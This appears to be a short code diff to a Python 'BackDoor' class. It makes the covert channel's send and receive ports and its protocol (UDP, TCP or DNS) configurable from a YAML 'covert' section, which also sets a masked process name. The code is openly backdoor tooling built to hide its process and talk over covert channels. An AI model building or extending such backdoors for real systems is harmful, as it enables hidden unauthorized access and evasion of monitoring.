@@ -125,12 +125,14 @@ class BackDoor:
         self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
         self.flag_begin = "****["
         self.flag_close = "]****"
-        self.port = 53
-        self.client_port = 8888
+        self.recv_port = 0
+        self.send_port = 0
         self.client = ""
         self.masked_name = ""
         self.log = ""
         self.device = ""
+        self.supported_protos = ["udp", "tcp", "dns"]
+        self.proto = ""
 
     def start(self):
         self.process_yaml()
@@ -166,9 +168,15 @@ class BackDoor:
         self.masked_name = config['covert']['process_name']
         self.log = config['covert']['log']
         self.device = config['covert']['device']
+        self.recv_port = config['covert']['recv_port']
+        self.send_port = config['covert']['send_port']
+        self.proto = config['covert']['proto']
         print(f"Masked as {self.masked_name}")
         print(f"log to {self.log}")
         print(f"device is {self.device}")
+        print(f"Send is {self.send_port}")
+        print(f"recv is {self.recv_port}")
+        print(f"proto  is {self.proto}")
 
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
